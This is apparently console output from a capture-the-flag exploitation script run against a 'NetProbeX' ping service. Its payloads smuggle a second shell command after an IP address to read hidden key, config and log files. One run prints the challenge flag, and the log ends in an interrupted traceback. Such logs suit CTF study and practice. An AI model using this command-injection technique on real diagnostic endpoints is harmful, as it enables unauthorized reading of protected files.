64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.75 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.630/3.737/3.887/0.096 ms
/bin/sh: 2: strings: not found

================================================================================

[18/20] Testing: Strings on mission_beta

================================================================================
PAYLOAD: Strings on mission_beta
Command: 8.8.8.8
strings /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.74 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.77 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.680/3.739/3.769/0.035 ms
/bin/sh: 2: strings: not found

================================================================================

[19/20] Testing: Awk mission_alpha

================================================================================
PAYLOAD: Awk mission_alpha
Command: 8.8.8.8
awk '{print}' /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
Error: Malicious character '{' detected.
================================================================================

[20/20] Testing: Awk mission_beta

================================================================================
PAYLOAD: Awk mission_beta
Command: 8.8.8.8
awk '{print}' /var/lib/aethercorp/missions/mission_beta.txt
--------------------------------------------------------------------------------
Error: Malicious character '{' detected.
================================================================================


================================================================================
Exploitation complete!
================================================================================

C:\Citadel_CTF_Writeups>python -u "c:\Citadel_CTF_Writeups\ext2.py"

    ╔═══════════════════════════════════════════════════════════╗
    ║  AetherCorp NetProbeX - CTF Exploitation Script          ║
    ║  Target: http://chall_citadel.cryptonitemit.in:32772     ║
    ╚═══════════════════════════════════════════════════════════╝


[1/15] Testing: READ BLACKSITE KEY!

================================================================================
PAYLOAD: READ BLACKSITE KEY!
Command: 8.8.8.8
head /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.66 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.79 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.78 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.655/3.748/3.792/0.054 ms
citadel{bl4ck51t3_4cc3ss_gr4nt3d}

================================================================================

[2/15] Testing: READ with tail

================================================================================
PAYLOAD: READ with tail
Command: 8.8.8.8
tail /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
ERROR: Request timed out
================================================================================

[3/15] Testing: READ with more

================================================================================
PAYLOAD: READ with more
Command: 8.8.8.8
more /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
ERROR: Request timed out
================================================================================

[4/15] Testing: READ with nl

================================================================================
PAYLOAD: READ with nl
Command: 8.8.8.8
nl /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
ERROR: Request timed out
================================================================================

[5/15] Testing: READ with strings

================================================================================
PAYLOAD: READ with strings
Command: 8.8.8.8
strings /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
ERROR: Request timed out
================================================================================

[6/15] Testing: READ with awk

================================================================================
PAYLOAD: READ with awk
Command: 8.8.8.8
awk '{print}' /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
--------------------------------------------------------------------------------
ERROR: Request timed out
================================================================================

[7/15] Testing: Read VERSION

================================================================================
PAYLOAD: Read VERSION
Command: 8.8.8.8
head /var/lib/aethercorp/VERSION
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.70 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.81 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.700/3.757/3.808/0.038 ms
NetProbeX v2.1.3

================================================================================

[8/15] Testing: Read probe_config.xml

================================================================================
PAYLOAD: Read probe_config.xml
Command: 8.8.8.8
head /var/lib/aethercorp/configs/probe_config.xml
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.77 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.68 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.665/3.721/3.775/0.050 ms
<?xml version="1.0"?><config><mode>standby</mode><network-interface>eth0</network-interface></config>   

================================================================================

[9/15] Testing: Read system_health.log

================================================================================
PAYLOAD: Read system_health.log
Command: 8.8.8.8
head /var/lib/aethercorp/logs/system_health.log
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.79 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.80 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.76 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.666/3.753/3.797/0.052 ms
[2025-08-15 10:00:12] INFO: System health check PASSED. Probe active on eth0.
[2025-08-15 10:00:13] AUDIT: Service started by PID 1984.
[2025-08-15 10:05:45] ALERT: Suspicious connection detected from 10.12.34.56
[2025-08-15 10:07:22] INFO: Backup completed successfully.

================================================================================

[10/15] Testing: Read telemetry_001

================================================================================
PAYLOAD: Read telemetry_001
Command: 8.8.8.8
head /var/lib/aethercorp/cache/telemetry/telemetry_001.log
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.64 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.78 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.75 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 3.637/3.737/3.784/0.059 ms
Telemetry Log 001: CPU load 23%, Memory 58%, Network 120kb/s

================================================================================

[11/15] Testing: Read telemetry_002

================================================================================
PAYLOAD: Read telemetry_002
Command: 8.8.8.8
head /var/lib/aethercorp/cache/telemetry/telemetry_002.log
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.75 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.89 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.81 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.681/3.782/3.890/0.076 ms
Telemetry Log 002: CPU load 19%, Memory 61%, Network 130kb/s

================================================================================

[12/15] Testing: Read mission_alpha

================================================================================
PAYLOAD: Read mission_alpha
Command: 8.8.8.8
head /var/lib/aethercorp/missions/mission_alpha.txt
--------------------------------------------------------------------------------
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.81 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.91 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.80 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.668/3.795/3.907/0.084 ms
Mission Alpha: Recon success. Target: Sector 7G

================================================================================

[13/15] Testing: Read mission_beta
Traceback (most recent call last):
  File "c:\Citadel_CTF_Writeups\ext2.py", line 104, in <module>
    main()
  File "c:\Citadel_CTF_Writeups\ext2.py", line 85, in main
    result = send_payload(payload)
             ^^^^^^^^^^^^^^^^^^^^^
  File "c:\Citadel_CTF_Writeups\ext2.py", line 25, in send_payload
    response = requests.post(PING_ENDPOINT, json=data, headers=headers, timeout=10)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\requests\api.py", line 115, in post
    return request("post", url, data=data, json=json, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\requests\api.py", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\requests\sessions.py", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\requests\sessions.py", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\requests\adapters.py", line 667, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\urllib3\connectionpool.py", line 789, in urlopen
    response = self._make_request(
               ^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\urllib3\connectionpool.py", line 536, in _make_request
    response = conn.getresponse()
               ^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\site-packages\urllib3\connection.py", line 507, in getresponse
    httplib_response = super().getresponse()
                       ^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\http\client.py", line 1428, in getresponse
    response.begin()
  File "C:\Python312\Lib\http\client.py", line 331, in begin
    version, status, reason = self._read_status()
                              ^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\http\client.py", line 292, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Python312\Lib\socket.py", line 708, in readinto
    return self._sock.recv_into(b)
           ^^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt
^C
C:\Citadel_CTF_Writeups>^A